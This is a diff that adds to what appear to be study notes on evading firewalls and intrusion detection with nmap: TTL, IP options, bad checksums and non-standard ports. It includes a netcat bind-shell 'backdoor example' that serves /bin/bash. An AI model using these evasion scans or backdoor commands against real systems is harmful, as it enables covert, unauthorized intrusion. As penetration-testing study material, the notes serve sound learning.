@@ -77,3 +77,41 @@
 #### nmap -sS -Pn --data-length NUM -F TARGET_IP
 
 ### TIP: Multiple of 8
+
+# EVASION VIA MODIFYING HEADER FIELDS
+
+## Set Time To Live (TTL)
+
+### option: --ttl NUM
+
+#### nmap -sS -Pn --ttl NUM -F TARGET_IP
+
+## Set IP options
+
+### option: --ip-options HEX_STRING
+
+### 1 byte in hex: \xHH
+
+### Other options:
+
+### 1) R = to record route
+
+### 2) T = to record timestamp
+
+### 3) U = record route and record timestamp
+
+### 4) L = Loose routing (Source)
+
+### 5) S = Strict routing (Source)
+
+## Wrong checksum
+
+### option: --badsum
+
+#### nmap -sS -Pn --badsum -F TARGET_IP
+
+# EVASION USING NON-STANDARD PORTS
+
+### Backdoor example: nc -lvnp PORT -e /bin/bash
+
+### TIP: run as root to use ports below 1024 with netcat
